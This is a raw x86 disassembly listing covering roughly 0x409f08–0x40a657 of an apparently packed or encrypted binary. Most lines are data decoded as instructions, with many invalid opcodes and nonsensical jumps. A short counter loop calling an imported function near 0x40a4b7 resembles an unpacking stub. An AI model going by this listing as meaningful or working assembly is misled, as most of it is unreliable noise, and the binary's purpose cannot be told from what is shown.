  409f08:	in     al,0x2c
  409f0a:	and    al,0x63
  409f0c:	xchg   ebx,eax
  409f0d:	or     eax,0xc1390105
  409f12:	test   BYTE PTR [edi+0x1e],dh
  409f15:	out    dx,al
  409f16:	and    ah,bh
  409f18:	jns    0x409f3a
  409f1a:	pop    ds
  409f1b:	push   edx
  409f1c:	dec    esi
  409f1d:	push   0x366b6327
  409f22:	add    DWORD PTR [eax-0x1e4ff1c],eax
  409f28:	sub    esi,edi
  409f2a:	pop    ss
  409f2b:	stc    
  409f2c:	cmpxchg bh,dh
  409f2f:	pop    esi
  409f30:	or     eax,0x48a312f0
  409f35:	xchg   si,ax
  409f37:	les    ebx,FWORD PTR [esi]
  409f39:	shl    BYTE PTR [eax+0x53],cl
  409f3c:	and    eax,DWORD PTR [edi-0x8b4dbce]
  409f42:	push   ecx
  409f43:	dec    ebx
  409f44:	add    eax,0x62abad07
  409f49:	inc    BYTE PTR [edi-0x6b]
  409f4c:	lods   eax,DWORD PTR ds:[esi]
  409f4d:	cmp    eax,0xbbe2a690
  409f52:	cmp    BYTE PTR [edi+0x0],0x52
  409f56:	sub    BYTE PTR [edx+0x2243e64b],ch
  409f5c:	pop    esi
  409f5d:	adc    DWORD PTR [esi+0x28],eax
  409f60:	lock jno 0x409ee5
  409f63:	cli    
  409f64:	or     ah,ah
  409f66:	cmp    eax,0x3f377118
  409f6b:	xchg   edx,eax
  409f6c:	jns    0x409fa2
  409f6e:	inc    edi
  409f6f:	mov    edx,0x9322dd0e
  409f74:	xor    DWORD PTR [ebp+0x24],esi
  409f77:	in     eax,0x3c
  409f79:	mov    dh,dh
  409f7b:	or     bl,BYTE PTR [edi]
  409f7d:	arpl   bp,si
  409f7f:	add    edi,DWORD PTR [edx*2+0x40bbbc47]
  409f86:	lods   eax,DWORD PTR ds:[esi]
  409f87:	lea    ebx,[esi-0x6b]
  409f8a:	je     0x409fb7
  409f8c:	ja     0x409f66
  409f8e:	out    0x8f,eax
  409f90:	or     eax,0x598f7df8
  409f95:	mov    ebx,0x6fa9ec6b
  409f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f9b:	sbb    dl,0xc1
  409f9e:	fiadd  WORD PTR [ecx+0x6e]
  409fa1:	push   edi
  409fa2:	sub    bh,0xb6
  409fa5:	enter  0x5e3c,0xaa
  409fa9:	pop    es
  409faa:	pop    ebx
  409fab:	mov    esp,DWORD PTR [edx+0x5c1e0db4]
  409fb1:	hlt    
  409fb2:	xchg   ebx,eax
  409fb3:	cli    
  409fb4:	cmp    ah,ch
  409fb6:	mov    dl,0x11
  409fb8:	repnz cmc 
  409fba:	xlat   BYTE PTR ds:[ebx]
  409fbb:	daa    
  409fbc:	stos   BYTE PTR es:[edi],al
  409fbd:	add    al,0xac
  409fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fc0:	icebp  
  409fc1:	stc    
  409fc2:	stc    
  409fc3:	mov    eax,ds:0x24aaeffe
  409fc8:	dec    ecx
  409fc9:	fmul   QWORD PTR [ebp+0x92a1c9d]
  409fcf:	lock pop ebp
  409fd1:	cmp    DWORD PTR [ebx+0x7e31882d],edx
  409fd7:	push   edx
  409fd8:	(bad)  
  409fd9:	cmp    esp,DWORD PTR [ecx-0x433ae626]
  409fdf:	jmp    0x409ff6
  409fe1:	xchg   esi,eax
  409fe2:	test   BYTE PTR [edx],al
  409fe4:	in     eax,0x55
  409fe6:	vmread DWORD PTR [ebx+0x4d],edx
  409fea:	xchg   bl,bh
  409fec:	nop
  409fed:	mov    ebx,0x8a34562b
  409ff2:	push   edx
  409ff3:	shr    esi,cl
  409ff5:	shl    DWORD PTR [edx-0x4f],1
  409ff8:	ds lock pop esi
  409ffb:	int    0x36
  409ffd:	fist   WORD PTR [eax]
  409fff:	aam    0xbc
  40a001:	sub    edi,edx
  40a003:	outs   dx,BYTE PTR ds:[esi]
  40a004:	jne    0x40a03f
  40a006:	enter  0x1d3b,0xc
  40a00a:	cmp    dh,ah
  40a00c:	sub    bh,al
  40a00e:	inc    ebx
  40a00f:	enter  0x9eee,0x67
  40a013:	jl     0x409f97
  40a015:	xchg   BYTE PTR [ebx],ch
  40a017:	std    
  40a018:	scas   eax,DWORD PTR es:[edi]
  40a019:	scas   eax,DWORD PTR es:[edi]
  40a01a:	rcr    DWORD PTR [edx-0x6e],cl
  40a01d:	fsubr  QWORD PTR [eax-0x4f]
  40a020:	stc    
  40a021:	mov    dh,BYTE PTR [ecx+esi*4+0x49]
  40a025:	pop    edi
  40a026:	neg    BYTE PTR [edx-0x2a]
  40a029:	inc    esp
  40a02a:	xchg   esp,eax
  40a02b:	and    esi,DWORD PTR [esi]
  40a02d:	cdq    
  40a02e:	mov    eax,ds:0xbf38d2e
  40a033:	loope  0x409ff1
  40a035:	inc    eax
  40a036:	xchg   esi,eax
  40a037:	fdivr  QWORD PTR [ebp-0x5a]
  40a03a:	push   es
  40a03b:	stos   BYTE PTR es:[edi],al
  40a03c:	sti    
  40a03d:	mov    ds:0xa0f9cb3d,eax
  40a042:	sbb    DWORD PTR [edx+0x33],edx
  40a045:	xchg   ebx,esi
  40a047:	int    0xcc
  40a049:	inc    ebx
  40a04a:	pop    es
  40a04b:	sti    
  40a04c:	dec    esp
  40a04d:	jge    0x40a09f
  40a04f:	hlt    
  40a050:	out    dx,al
  40a051:	in     al,0x41
  40a053:	jb     0x40a03c
  40a055:	popa   
  40a056:	xchg   ecx,eax
  40a057:	inc    edi
  40a058:	sbb    esp,ebx
  40a05a:	sbb    BYTE PTR [ebx+0x5d],0x51
  40a05e:	sbb    DWORD PTR [ecx-0x8],ebx
  40a061:	je     0xf6d11bd7
  40a067:	dec    esp
  40a068:	and    al,0x2c
  40a06a:	jae    0x40a0a1
  40a06c:	ja     0x40a023
  40a06e:	pop    edi
  40a06f:	mov    dh,0x39
  40a071:	inc    ebp
  40a072:	mov    ch,0x2c
  40a074:	fisttp DWORD PTR [edi]
  40a076:	xor    cl,0xbe
  40a079:	adc    DWORD PTR [edi-0x1d39af72],eax
  40a07f:	add    al,BYTE PTR [ebp-0x2f]
  40a082:	sbb    esi,edx
  40a084:	or     BYTE PTR [edi-0x2421a843],ch
  40a08a:	ficom  DWORD PTR [eax+0x7e]
  40a08d:	xchg   edx,eax
  40a08e:	imul   edx,DWORD PTR [edi-0x40],0x75115128
  40a095:	push   ss
  40a096:	push   ecx
  40a097:	add    bh,BYTE PTR [edi-0x4f]
  40a09a:	push   ebx
  40a09b:	xor    bh,ch
  40a09d:	xchg   esi,eax
  40a09e:	dec    eax
  40a09f:	xor    dh,0xb9
  40a0a2:	xor    eax,0x7e0363f8
  40a0a7:	fsub   QWORD PTR [esi+0x69]
  40a0aa:	out    0x67,al
  40a0ac:	outs   dx,BYTE PTR ds:[esi]
  40a0ad:	shl    DWORD PTR [ebp-0x3fc7f459],0xcb
  40a0b4:	outs   dx,BYTE PTR ds:[esi]
  40a0b5:	dec    ebp
  40a0b6:	nop
  40a0b7:	xchg   DWORD PTR [esi+0x52],ebx
  40a0ba:	test   BYTE PTR [esi],0xe9
  40a0bd:	(bad)  
  40a0be:	mov    edi,0xd07a5263
  40a0c3:	sbb    ebp,esp
  40a0c5:	ror    DWORD PTR [edx-0x687c6d9b],1
  40a0cb:	mov    bl,0xe8
  40a0cd:	(bad)  
  40a0cf:	jns    0x40a080
  40a0d1:	and    eax,0x86d8544f
  40a0d6:	or     eax,0x8f6fcceb
  40a0db:	retf   0xd90d
  40a0de:	test   al,0x52
  40a0e0:	fisttp DWORD PTR [ecx+0x0]
  40a0e3:	das    
  40a0e4:	aam    0x52
  40a0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0e7:	jnp    0x40a06b
  40a0e9:	mov    al,ds:0x8257607d
  40a0ee:	pop    esi
  40a0ef:	sahf   
  40a0f0:	es in  eax,dx
  40a0f2:	loopne 0x40a0bc
  40a0f4:	push   es
  40a0f5:	cmc    
  40a0f6:	add    bh,dl
  40a0f8:	xor    DWORD PTR [edx+ebx*4-0x3b],ecx
  40a0fc:	hlt    
  40a0fd:	hlt    
  40a0fe:	pop    edx
  40a0ff:	sbb    BYTE PTR [edi],al
  40a101:	icebp  
  40a102:	sbb    ebx,esi
  40a104:	sbb    al,0x43
  40a106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a108:	pop    ecx
  40a109:	push   eax
  40a10a:	pop    ebx
  40a10b:	arpl   WORD PTR [ebp+0x448ad8a9],bx
  40a111:	ds leave 
  40a113:	cmp    esp,DWORD PTR [ebx+ebp*1]
  40a116:	add    BYTE PTR ss:[esi],bh
  40a119:	push   edi
  40a11a:	ss lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a11e:	adc    DWORD PTR [ebp-0x3be6fb9d],0x53
  40a125:	pop    ss
  40a126:	shr    DWORD PTR [edx+0x188c92bb],cl
  40a12c:	bound  edi,QWORD PTR [esi]
  40a12e:	fld    QWORD PTR [esi-0x33401323]
  40a134:	xchg   esi,eax
  40a135:	xor    esi,DWORD PTR [ebx-0x59421c6]
  40a13b:	mov    bh,BYTE PTR [ebp+0x52a2c1bf]
  40a141:	jle    0x40a134
  40a143:	out    0x88,eax
  40a145:	mov    ah,0x2
  40a147:	lahf   
  40a148:	add    al,0x48
  40a14a:	mov    dh,0x6c
  40a14c:	retf   
  40a14d:	mov    ds,WORD PTR [ebx+0x5d]
  40a150:	dec    edi
  40a151:	ret    
  40a152:	push   edi
  40a153:	sub    al,0x43
  40a155:	adc    eax,0xdb88fdff
  40a15a:	inc    edx
  40a15b:	jp     0x40a11c
  40a15d:	or     eax,0x233d3bc
  40a162:	cdq    
  40a163:	repnz cdq 
  40a165:	mov    BYTE PTR [ebx],dh
  40a167:	(bad)  
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	scas   eax,DWORD PTR es:[edi]
  40a17a:	cli    
  40a17b:	add    edx,ebx
  40a17d:	cmp    edi,esp
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a1c3
  40a186:	pop    esi
  40a187:	mov    eax,ds:0xb0a4d63a
  40a18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a18d:	fdiv   QWORD PTR [ecx]
  40a18f:	scas   eax,DWORD PTR es:[edi]
  40a190:	iret   
  40a191:	adc    eax,0x7440dcc7
  40a196:	pop    ebp
  40a197:	rcl    DWORD PTR [ebp+0x34],1
  40a19a:	pop    edi
  40a19b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a19c:	push   ss
  40a19d:	sbb    BYTE PTR [eax+0x1b],ah
  40a1a0:	repnz mov ebp,0x5769ebd7
  40a1a6:	cdq    
  40a1a7:	pop    ss
  40a1a8:	fstp   QWORD PTR [edi+0x1f]
  40a1ab:	mov    al,ds:0x7477ee19
  40a1b0:	push   cs
  40a1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b2:	sbb    BYTE PTR [ebx],dh
  40a1b4:	in     al,dx
  40a1b5:	jno    0x40a142
  40a1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b8:	rcl    DWORD PTR [edx+esi*1],0x99
  40a1bc:	xor    edx,DWORD PTR [eax-0x67b22949]
  40a1c2:	mov    bh,0x25
  40a1c4:	xchg   ebx,eax
  40a1c5:	sub    ah,BYTE PTR [edi]
  40a1c7:	imul   ebx,DWORD PTR [bx+si+0x16],0x6b43bafc
  40a1cf:	aam    0x43
  40a1d1:	(bad)  
  40a1d3:	icebp  
  40a1d4:	out    dx,eax
  40a1d5:	(bad)  [ebp*2-0x4ec46d7b]
  40a1dc:	outs   dx,BYTE PTR ds:[esi]
  40a1dd:	stos   BYTE PTR es:[edi],al
  40a1de:	arpl   WORD PTR [ecx-0x5af35023],bx
  40a1e4:	mov    eax,0x946e6872
  40a1e9:	xlat   BYTE PTR ds:[ebx]
  40a1ea:	mov    BYTE PTR [edx],ch
  40a1ec:	cmp    ah,dh
  40a1ee:	(bad)  
  40a1ef:	sbb    esi,DWORD PTR [edx+edi*1-0x21]
  40a1f3:	mov    al,ds:0xf17638d7
  40a1f8:	inc    edx
  40a1f9:	mov    al,0x5
  40a1fb:	mov    esp,eax
  40a1fd:	call   0x84b8fbcb
  40a202:	ins    BYTE PTR es:[edi],dx
  40a203:	in     al,dx
  40a204:	out    dx,al
  40a205:	out    dx,al
  40a206:	repnz fcmovbe st,st(1)
  40a209:	pop    ebx
  40a20a:	sub    cl,BYTE PTR [edi-0x79]
  40a20d:	rol    DWORD PTR [edx-0x60],1
  40a210:	fs jl  0x40a238
  40a213:	xchg   ecx,eax
  40a214:	cmc    
  40a215:	repz ja 0x40a1f7
  40a218:	xchg   ebx,eax
  40a219:	leave  
  40a21a:	aaa    
  40a21b:	mov    cl,al
  40a21d:	xchg   ebx,eax
  40a21e:	mov    ah,BYTE PTR [edx-0xdcec9bd]
  40a224:	and    DWORD PTR [edx],edi
  40a226:	pop    ebp
  40a227:	mov    bl,0x3a
  40a229:	ds fwait
  40a22b:	sub    DWORD PTR [esi],edi
  40a22d:	cmp    eax,0xca03a62b
  40a232:	mov    cl,0x49
  40a234:	adc    DWORD PTR gs:[edx],edx
  40a237:	daa    
  40a238:	rcl    ebp,1
  40a23a:	int3   
  40a23b:	std    
  40a23c:	(bad)  
  40a23d:	repz pop edi
  40a23f:	in     al,0xb6
  40a241:	sub    ebx,DWORD PTR [ebx+0x3fe5cb62]
  40a247:	mov    ebp,0xf38ffe7a
  40a24c:	pop    esp
  40a24d:	jbe    0x40a270
  40a24f:	sahf   
  40a250:	jns    0x40a214
  40a252:	cs ja  0x40a2cb
  40a255:	lods   al,BYTE PTR ds:[esi]
  40a256:	or     eax,0x9e4094d8
  40a25b:	add    eax,0x489b1022
  40a260:	iret   
  40a261:	clc    
  40a262:	xchg   ecx,eax
  40a263:	jb     0x40a22e
  40a265:	pmulhw mm0,QWORD PTR [ebp+0x74]
  40a269:	adc    eax,0x8fe22fb3
  40a26e:	pop    ebp
  40a26f:	jle    0x40a2b7
  40a271:	(bad)  
  40a272:	sub    ecx,ebx
  40a274:	mov    ah,0x9d
  40a276:	mov    cl,0x93
  40a278:	lds    esi,FWORD PTR [ebx]
  40a27a:	mov    bh,BYTE PTR [eax+0x2b]
  40a27d:	jae    0x40a2e1
  40a27f:	pop    ds
  40a280:	call   DWORD PTR [esi-0x7798a035]
  40a286:	gs lahf 
  40a288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a289:	mov    ds:0xc96980f2,eax
  40a28e:	jecxz  0x40a304
  40a290:	std    
  40a291:	dec    ecx
  40a292:	std    
  40a293:	aam    0xb
  40a295:	cld    
  40a296:	repnz repz inc ebx
  40a299:	ret    
  40a29a:	jecxz  0x40a27d
  40a29c:	lods   al,BYTE PTR ds:[esi]
  40a29d:	lds    edx,FWORD PTR ds:0xeb7e59f4
  40a2a3:	jns    0x40a269
  40a2a5:	add    dl,dh
  40a2a7:	pop    edi
  40a2a8:	loopne 0x40a2a6
  40a2aa:	xor    DWORD PTR [ebx],edx
  40a2ac:	fwait
  40a2ad:	mov    al,ds:0x8a8d2874
  40a2b2:	jp     0x40a2f8
  40a2b4:	pop    ss
  40a2b5:	hlt    
  40a2b6:	inc    ebx
  40a2b7:	mov    ch,0xaa
  40a2b9:	push   0x1403a572
  40a2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bf:	mov    cl,bh
  40a2c1:	dec    ecx
  40a2c2:	mov    dh,0xec
  40a2c4:	xor    eax,0x40532391
  40a2c9:	jae    0x40a273
  40a2cb:	pop    esi
  40a2cc:	cmp    BYTE PTR [ebx],dh
  40a2ce:	fwait
  40a2cf:	das    
  40a2d0:	add    al,0x52
  40a2d2:	in     al,0x7b
  40a2d4:	cmp    DWORD PTR [edx-0x549b5fa0],ebx
  40a2da:	in     eax,0xa4
  40a2dc:	jo     0x40a315
  40a2de:	aam    0x6a
  40a2e0:	je     0x40a2d6
  40a2e2:	cs mov al,0xb2
  40a2e5:	xchg   DWORD PTR [eax-0x6f],esi
  40a2e8:	stos   BYTE PTR es:[edi],al
  40a2e9:	bound  ebx,QWORD PTR [edx]
  40a2eb:	mov    eax,ds:0xa8fd5841
  40a2f0:	adc    ebp,DWORD PTR [edx-0x27]
  40a2f3:	adc    ebp,esi
  40a2f5:	push   ebx
  40a2f6:	scas   eax,DWORD PTR es:[edi]
  40a2f7:	sar    BYTE PTR [ebx+0xc952ed2],0x94
  40a2fe:	sti    
  40a2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a300:	loopne 0x40a374
  40a302:	outs   dx,BYTE PTR ds:[esi]
  40a303:	mov    ebp,0x8298cc46
  40a308:	jp     0x40a2ff
  40a30a:	mov    ecx,DWORD PTR [edi+0x15efd5e8]
  40a310:	shr    BYTE PTR [ebx],0x2e
  40a313:	mov    bh,0x0
  40a315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a316:	iret   
  40a317:	ret    
  40a318:	shr    DWORD PTR [eax+0x8d0f076],1
  40a31e:	add    al,0xd5
  40a320:	mov    bl,0xce
  40a322:	imul   esi,DWORD PTR [edx+0x740ddef4],0x970dbdd9
  40a32c:	ret    
  40a32d:	dec    ebx
  40a32e:	jl     0x40a2bd
  40a330:	retf   
  40a331:	cmp    DWORD PTR [edx],ebx
  40a333:	mov    eax,0xe77ca748
  40a338:	jmp    0xe721ce6f
  40a33d:	neg    BYTE PTR [eax+0x1758047c]
  40a343:	ficomp WORD PTR [ecx+0x581e17c6]
  40a349:	inc    ecx
  40a34a:	mov    ah,BYTE PTR [edx]
  40a34c:	mov    al,0xc8
  40a34e:	inc    eax
  40a34f:	lock dec esi
  40a351:	inc    DWORD PTR [eax-0x4369feb9]
  40a357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a358:	and    dl,BYTE PTR [edx-0x80]
  40a35b:	inc    ecx
  40a35c:	arpl   WORD PTR [ebp+esi*1+0x37327b4f],sp
  40a363:	sbb    bh,BYTE PTR [edx+0x689662ce]
  40a369:	cmp    BYTE PTR [ebx],bl
  40a36b:	pop    edi
  40a36c:	mov    esi,0xcdbde932
  40a371:	mov    ah,0xd3
  40a373:	cmp    eax,0x7885b002
  40a378:	mov    eax,0xc92155fe
  40a37d:	jge    0x40a3c0
  40a37f:	and    dh,BYTE PTR [ecx-0x7e]
  40a382:	cmp    cl,BYTE PTR [esi]
  40a384:	stc    
  40a385:	push   esi
  40a386:	ror    DWORD PTR [edi],0x85
  40a389:	jne    0x40a351
  40a38b:	rcr    DWORD PTR [edx+0x51],0x56
  40a38f:	mov    ah,0xaa
  40a391:	xor    ecx,DWORD PTR [eax-0x7b]
  40a394:	and    BYTE PTR [esi+0x2c02e338],0xf7
  40a39b:	sbb    ch,BYTE PTR [ebp*2+0x43b2a39f]
  40a3a2:	push   ecx
  40a3a3:	call   0xe9f82805
  40a3a8:	inc    esp
  40a3a9:	pop    esi
  40a3aa:	jmp    0x8248:0xba3657fe
  40a3b1:	imul   esi,DWORD PTR [edi+0x73],0x394104c8
  40a3b8:	sub    BYTE PTR [edx],ah
  40a3ba:	jo     0x40a3fe
  40a3bc:	mov    bh,0x36
  40a3be:	xchg   esi,eax
  40a3bf:	mov    ah,0x79
  40a3c1:	out    dx,al
  40a3c2:	xor    BYTE PTR [eax-0x4a],ch
  40a3c5:	inc    edi
  40a3c6:	lods   eax,DWORD PTR ds:[esi]
  40a3c7:	xor    al,0xec
  40a3c9:	adc    eax,0x7fed85a6
  40a3ce:	and    eax,0x10820e27
  40a3d3:	xor    ecx,ebx
  40a3d5:	cmp    ecx,DWORD PTR [edx-0x2d]
  40a3d8:	(bad)  
  40a3d9:	jl     0x40a433
  40a3db:	cmp    edi,ebx
  40a3dd:	push   edi
  40a3de:	mov    esp,0x477c369c
  40a3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3e4:	mov    dh,BYTE PTR [esi+0x36]
  40a3e7:	cdq    
  40a3e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3e9:	sbb    eax,0xd709907a
  40a3ee:	out    dx,eax
  40a3ef:	xchg   DWORD PTR [ecx],eax
  40a3f1:	enter  0xe1f0,0xf7
  40a3f5:	or     al,0xa2
  40a3f7:	sbb    ah,cl
  40a3f9:	je     0x40a407
  40a3fb:	packssdw mm5,QWORD PTR [edi+0x7e]
  40a3ff:	xchg   edx,eax
  40a400:	aas    
  40a401:	aas    
  40a402:	xor    edi,DWORD PTR [esi]
  40a404:	jge    0x40a3b1
  40a406:	jno    0x40a3bb
  40a408:	xchg   DWORD PTR [esi+eax*1-0x76116c6c],ebp
  40a40f:	sbb    BYTE PTR [edx],dh
  40a411:	aam    0xd1
  40a413:	mov    dl,0xe3
  40a415:	cli    
  40a416:	push   eax
  40a417:	or     eax,0xcc94b84b
  40a41c:	and    al,0xf6
  40a41e:	push   ecx
  40a41f:	jne    0x40a47d
  40a421:	pushf  
  40a422:	add    al,0x20
  40a424:	enter  0xbf35,0xc1
  40a428:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a42a:	outs   dx,BYTE PTR ds:[esi]
  40a42b:	fs test eax,0x1819330f
  40a431:	jns    0x40a3ea
  40a433:	test   al,0x49
  40a435:	adc    BYTE PTR [esi],0x59
  40a438:	and    bl,dh
  40a43a:	add    ecx,ebp
  40a43c:	aam    0x7e
  40a43e:	and    eax,0xd65ba92c
  40a443:	imul   BYTE PTR [ebp-0x4e]
  40a446:	jmp    FWORD PTR [edi+0x13514430]
  40a44c:	push   esp
  40a44d:	mov    bh,BYTE PTR [edx]
  40a44f:	scas   al,BYTE PTR es:[edi]
  40a450:	(bad)  
  40a451:	mov    eax,ds:0x30f6c38d
  40a456:	div    eax
  40a458:	sbb    al,0xac
  40a45a:	nop
  40a45b:	pop    ss
  40a45c:	test   eax,0xb129bf95
  40a461:	aas    
  40a462:	inc    ecx
  40a463:	sbb    DWORD PTR [eax],ecx
  40a465:	and    eax,DWORD PTR [edx-0x4375fe5c]
  40a46b:	cmp    al,0xb5
  40a46d:	fdivr  QWORD PTR [edx-0x2bd533aa]
  40a473:	mov    ebx,DWORD PTR [esi+0xa]
  40a476:	(bad)  
  40a477:	outs   dx,DWORD PTR ds:[esi]
  40a478:	stos   BYTE PTR es:[edi],al
  40a479:	mov    dl,0x78
  40a47b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a47c:	sub    BYTE PTR [edx+edi*1],0x2c
  40a480:	in     eax,0x7a
  40a482:	sub    eax,0x20d5670d
  40a487:	div    BYTE PTR [ebx]
  40a489:	xor    al,0x70
  40a48b:	mov    ds:0x9e1dd310,eax
  40a490:	xor    edx,DWORD PTR [edi+esi*4]
  40a493:	xchg   edi,eax
  40a494:	mov    eax,ds:0x926dcc9
  40a499:	sbb    ch,bl
  40a49b:	rcr    ch,cl
  40a49d:	je     0x40a4a3
  40a49f:	call   DWORD PTR [ebx-0x3a]
  40a4a2:	(bad)  
  40a4a3:	adc    al,0xc7
  40a4a5:	sbb    ch,cl
  40a4a7:	mov    ah,0xb1
  40a4a9:	in     al,0x7e
  40a4ab:	mov    dh,0xf1
  40a4ad:	(bad)  
  40a4ae:	jb     0x40a4a8
  40a4b0:	add    DWORD PTR [ebx-0x35],eax
  40a4b3:	mov    ah,0x25
  40a4b5:	add    eax,edi
  40a4b7:	and    DWORD PTR ds:0x430471,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x430471
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x430471,ebx
  40a4d0:	cmp    DWORD PTR ds:0x430471,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42ec3b
  40a4e8:	cmp    DWORD PTR ds:0x430471,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	bound  edx,QWORD PTR ss:[ebp+0x1e]
  40a514:	sub    al,0xe9
  40a516:	loop   0x40a596
  40a518:	jle    0x40a548
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a593
  40a51e:	or     edx,edx
  40a520:	rcl    DWORD PTR [esi],1
  40a522:	loopne 0x40a596
  40a524:	mov    edi,0x2faa65a
  40a529:	inc    esp
  40a52a:	addr16 int 0x3a
  40a52d:	ins    BYTE PTR es:[edi],dx
  40a52e:	popf   
  40a52f:	call   0x9f0a6631
  40a534:	out    dx,al
  40a535:	adc    eax,0xeb214bcc
  40a53a:	xor    ebx,0x33
  40a53d:	adc    esp,DWORD PTR [eax+0x77d14445]
  40a543:	jbe    0x40a52f
  40a545:	mov    ah,0xfc
  40a547:	xchg   edi,eax
  40a548:	mov    al,0x5f
  40a54a:	add    eax,0x806c3163
  40a54f:	push   ds
  40a550:	push   esp
  40a551:	sbb    ecx,DWORD PTR [esi-0xe]
  40a554:	pop    edi
  40a555:	outs   dx,DWORD PTR ds:[esi]
  40a556:	cmp    al,0xea
  40a558:	cld    
  40a559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a55a:	jge    0x40a5d9
  40a55c:	dec    esp
  40a55d:	shl    DWORD PTR [ebx-0x124b5f02],1
  40a563:	xchg   ecx,eax
  40a564:	sar    DWORD PTR [ebx],1
  40a566:	in     eax,0xf0
  40a568:	jns    0x40a538
  40a56a:	xor    eax,0xc0108184
  40a56f:	pop    ds
  40a570:	adc    cl,0xd1
  40a573:	nop
  40a574:	mov    ch,0xf8
  40a576:	adc    esp,DWORD PTR ds:0x5124f706
  40a57c:	xchg   ecx,eax
  40a57d:	ret    0x24bd
  40a580:	cmp    eax,0xfaa871f7
  40a585:	push   eax
  40a586:	cmp    al,0xf8
  40a588:	ss adc eax,0xf4a56ff7
  40a58e:	mov    ebp,0xba470424
  40a593:	xchg   edi,eax
  40a594:	popa   
  40a595:	test   BYTE PTR [edx-0x46],al
  40a598:	stos   DWORD PTR es:[edi],eax
  40a599:	dec    BYTE PTR [ebx]
  40a59b:	inc    ebp
  40a59c:	inc    ebp
  40a59d:	aas    
  40a59e:	repz push 0x32eb511c
  40a5a4:	stos   DWORD PTR es:[edi],eax
  40a5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a6:	mov    dh,BYTE PTR [edi+0x8904132]
  40a5ac:	jbe    0x40a5d2
  40a5ae:	loop   0x40a591
  40a5b0:	stos   DWORD PTR es:[edi],eax
  40a5b1:	inc    esi
  40a5b2:	xchg   ebx,eax
  40a5b3:	mov    cl,0x39
  40a5b5:	cs mov esp,0xdf63d7c9
  40a5bb:	push   ebp
  40a5bc:	pushf  
  40a5bd:	icebp  
  40a5be:	adc    eax,0x49a4d87b
  40a5c3:	pop    ebp
  40a5c4:	pushf  
  40a5c5:	into   
  40a5c6:	fucomip st,st(2)
  40a5c8:	pop    ecx
  40a5c9:	jo     0x40a5d1
  40a5cb:	jmp    FWORD PTR [ebx+0x3]
  40a5ce:	rsm    
  40a5d0:	pop    edi
  40a5d1:	imul   esp,DWORD PTR [eax-0x43842144],0xf156cdf3
  40a5db:	or     dl,BYTE PTR [esp+esi*8-0x66]
  40a5df:	sar    DWORD PTR [esi],1
  40a5e1:	jae    0x40a64f
  40a5e3:	ins    BYTE PTR es:[edi],dx
  40a5e4:	(bad)  
  40a5e5:	cmp    BYTE PTR [ecx-0xe],dl
  40a5e8:	(bad)  
  40a5e9:	jge    0x40a5dd
  40a5eb:	dec    edi
  40a5ec:	sbb    DWORD PTR [ebx+0x4],0x19b980f9
  40a5f3:	mov    cl,0x82
  40a5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5f6:	xchg   esp,eax
  40a5f7:	call   0x19932f55
  40a5fc:	or     eax,0x2f2aa9ff
  40a601:	ret    0x4289
  40a604:	ret    
  40a605:	mov    ebp,DWORD PTR [eax-0x4a]
  40a608:	fs call 0xdb7b:0x22c055a3
  40a610:	js     0x40a5ef
  40a612:	sti    
  40a613:	mov    al,0xcc
  40a615:	sbb    DWORD PTR [ebx],edi
  40a617:	xor    al,0x4b
  40a619:	xchg   ebp,eax
  40a61a:	popa   
  40a61b:	cdq    
  40a61c:	out    0x36,eax
  40a61e:	icebp  
  40a61f:	mov    ecx,0x9bd187fb
  40a624:	lods   eax,DWORD PTR ds:[esi]
  40a625:	bound  esi,QWORD PTR [ecx]
  40a627:	inc    eax
  40a628:	jo     0x40a68f
  40a62a:	add    BYTE PTR ds:0xea047e1d,0x44
  40a631:	and    esp,DWORD PTR [edx-0x38]
  40a634:	inc    esi
  40a635:	adc    al,0xad
  40a637:	in     eax,0xf1
  40a639:	cdq    
  40a63a:	stc    
  40a63b:	sub    DWORD PTR ds:0x95b81dad,ecx
  40a641:	lds    esp,FWORD PTR [ebp+0xf]
  40a644:	push   0x396d855c
  40a649:	sbb    ecx,DWORD PTR [ecx+eiz*4-0x7a9d8131]
  40a650:	mov    edi,ebp
  40a652:	mov    eax,ds:0x6dd0d775
  40a657:	stos   DWORD PTR es:[edi],eax
